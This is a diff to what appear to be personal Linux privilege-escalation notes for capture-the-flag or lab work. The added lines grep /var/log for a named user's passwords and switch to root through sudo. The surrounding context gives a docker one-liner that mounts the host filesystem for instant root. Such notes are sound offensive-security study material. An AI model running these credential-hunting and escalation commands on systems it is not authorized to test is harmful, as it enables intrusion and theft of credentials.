@@ -5,6 +5,12 @@ id
 - if groups include "docker", try `docker ps`. if that works without sudo, run:
 	- `docker run -v /:/mnt --rm -it bash chroot /mnt sh`
 		- instant root
+- if groups include `(adm)`, allows for viewing of `/var/log`. run:
+```
+cd /var/log && grep -iR tyler
+```
+- searching logs for user named tyler, look for passwords
+
 ```
 sudo -l
 ```
@@ -19,6 +25,8 @@ sudo -l
      (scriptmanager : scriptmanager) NOPASSWD: ALL
 	- `sudo -u scriptmanager /bin/bash`
 		- switch to scriptmanager user
+	- or if (ALL : ALL) ALL, can switch to root
+		- `sudo -u root /bin/bash`
 
 ### SUID
 ```
